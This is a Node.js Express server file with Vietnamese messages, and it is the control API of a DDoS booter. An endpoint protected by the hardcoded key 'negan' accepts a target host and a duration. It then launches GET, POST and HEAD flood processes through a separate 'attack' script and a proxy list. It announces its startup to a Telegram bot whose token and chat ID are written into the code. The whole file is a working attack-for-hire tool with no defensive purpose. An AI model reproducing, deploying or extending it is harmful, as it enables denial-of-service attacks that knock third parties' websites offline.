const express = require("express");
const { spawn } = require("child_process");
const axios = require("axios");

const app = express();
const port = 8080;
const MAX_CONCURRENT_ATTACKS = 1;
const BOT_TOKEN = "7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw";
const CHAT_ID = "7371969470";

let activeAttacks = 0;
let currentPID = null;

const sendTelegramMessage = async (message) => {
    try { await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message }); console.log("Tin nhắn Telegram đã được gửi thành công."); }
    catch (error) { console.error("Lỗi khi gửi tin nhắn Telegram:", error.message); }
};

const validateInput = ({ key, host, time, method, port }) =>
    (![key, host, time, method, port].every(Boolean)) ? "THIẾU THAM SỐ" :
    (key !== "negan") ? "KEY KHÔNG HỢP LỆ" :
    (time > 200) ? "THỜI GIAN PHẢI < 200S" :
    (port < 1 || port > 65535) ? "CỔNG KHÔNG HỢP LỆ" : null;

const executeAttack = (command, time) => {
    const childProcess = spawn(command.split(" ")[0], command.split(" ").slice(1), { stdio: "inherit" });
    currentPID = childProcess.pid;
    console.log(`Tiến trình ${currentPID} đã được khởi chạy.`);

    const cleanup = () => { activeAttacks--; currentPID = null; console.log(`Tiến trình ${childProcess.pid} đã kết thúc. Slot được giải phóng.`); };

    childProcess.on("close", (code) => { console.log(`Tiến trình ${childProcess.pid} đã đóng với mã ${code}.`); cleanup(); });
    childProcess.on("error", (err) => { console.error(`Lỗi khi thực thi lệnh: ${err.message}`); cleanup(); });

    setTimeout(() => { if (currentPID === childProcess.pid) { console.error(`Tiến trình ${childProcess.pid} bị treo và đã bị hủy.`); childProcess.kill(); cleanup(); } }, time * 1000 + 10000);
};

const executeAllAttacks = (moduls, host, time) =>
    moduls.map((modul) => `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`).forEach((command) => executeAttack(command, time));

app.get("/api/attack", async (req, res) => {
    const { key, host, time, method, port, modul } = req.query;

    const response = (statusCode, status, message, data = {}) => res.status(statusCode).json({ status, message, ...data });

    if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) return response(429, "ERROR", "ĐANG CÓ CUỘC TẤN CÔNG KHÁC");

    const validationMessage = validateInput({ key, host, time, method, port });
    if (validationMessage) return response(400, "ERROR", validationMessage);

    activeAttacks++;

    try {
        if (modul === "FULL") {
            executeAllAttacks(["GET", "POST", "HEAD"], host, time);
            response(200, "SUCCESS", "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI", { host, port, time, modul: "GET POST HEAD", method, pid: currentPID });
        } else {
            const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
            executeAttack(command, time);
            response(200, "SUCCESS", "LỆNH TẤN CÔNG ĐÃ GỬI", { host, port, time, modul, method, pid: currentPID });
        }
    } catch (error) {
        console.error("Lỗi khi thực hiện tấn công:", error.message);
        response(500, "ERROR", "LỖI KHI THỰC HIỆN TẤN CÔNG");
    }
});

app.listen(port, () => {
    console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`);
    sendTelegramMessage(`🔹 API Server đang chạy tại cổng ${port}`).catch((err) => console.error("Lỗi khi gửi tin nhắn Telegram:", err));
});
